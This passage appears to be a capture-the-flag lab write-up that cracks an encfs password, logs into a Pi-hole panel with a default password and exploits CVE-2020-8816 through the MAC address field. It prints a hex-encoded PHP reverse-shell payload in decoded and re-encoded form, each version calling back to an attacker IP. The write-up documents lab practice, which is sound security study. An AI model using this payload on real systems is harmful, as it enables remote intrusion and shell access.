This is a file that dictates the properties of an encfs encrypted file system. I need to crack the password in order to decrypt the downloaded files. To do this, I need to get a hash from this file. I use encfs2john.py

encfs2john.py

Which gives a crackable hash:


└──╼ $./encfs2john.py rsync/

Looking at the TODO file:

So we should be able to find a docker that has a pi-hole hosted inside. This should have temporary admin password.

I run linpeas enum script, and can see some addresses that might be the pi-hole

I can still use the squid proxy to access these addresses from the browser, when accessing 172.31.11.3 the following page appears:

This is the address for the pi-hole. Clicking through to the admin panel, we need a password. Since the todo said the password was changed to a temporary admin password I try some basic passwords. admin works and we get into the pi-hole. The version can be seen at the bottom of the page as:

There is a cve for this version that results in remote code as found on:

CVE-2020-8816 - Pi-hole Remote Code Execution

This cve affects versions v4.3.2<= and since we are working with 4.3.2, this means it should be possible. The author states that there is a vulnerability in the MAC address field in the settings of the panel:

As an initial proof, we can do a simple exploit where we read the $PATH variable. First we must give a valid mac address, the author chooses aaaaaaaaaaaa then we add the $PATH to the end. We then have to put a valid ip address and hostname but these are not used so I will just use the box’s ip:

When we click the button to add the new lease configuration, the code we put is executed and we can see the path. The main difficult with the exploit is due to the fact that the input is a mac address. This means that the php for the input is ran through strtoupper which converts all the characters to uppercase. This means any input we do must be a valid command in uppercase.

Following further through the demonstration of the exploit, we can make our own payload, for simplicity, I copy the payload from the author, and replace the hex2bin of their payload with one I made. I used php hex2bin to translate the string into something readable:


$other=HEX2BIN("706870202D72202724736F636B3D66736F636B6F70656E282231302E312E302E39222C32323536293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27");

var_dump($other);

Which results in:


string(74) "php -r '$sock=fsockopen("10.1.0.9",2256);exec("/bin/sh -i <&3 >&3 2>&3");'"

I then change the ip and port for my own and use bin2hex to convert back to the string:


$mine=bin2hex('php -r \'$sock=fsockopen("10.10.14.217",9919);exec("/bin/sh -i <&3 >&3 2>&3");\'');

var_dump($mine);

Giving:


string(156) "706870202d72202724736f636b3d66736f636b6f70656e282231302e31302e31342e323137222c39393139293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27"

I replace the authors string with my own and add as a new dhcp configuration.
